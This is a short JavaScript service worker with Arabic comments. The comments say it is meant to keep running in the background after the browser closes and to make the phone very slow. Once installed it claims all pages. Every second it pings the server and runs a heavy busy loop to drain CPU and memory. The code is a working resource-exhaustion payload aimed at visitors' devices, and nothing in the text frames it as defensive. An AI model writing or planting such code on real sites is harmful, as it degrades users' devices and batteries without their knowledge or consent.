// هذا الكود يعمل في خلفية النظام ولا يموت بإغلاق المتصفح
self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim());
});

// إطلاق حلقة استهلاك موارد في الخلفية
setInterval(() => {
    // إشغال الذاكرة وإرسال إشارات للسيرفر ليبقى حياً
    fetch('/ping?status=active');
    
    // محاكاة عمليات ثقيلة في الخلفية تجعل الهاتف بطيئاً جداً
    for(let i=0; i<100000; i++) {
        const x = Math.sqrt(Math.random());
    }
}, 1000);
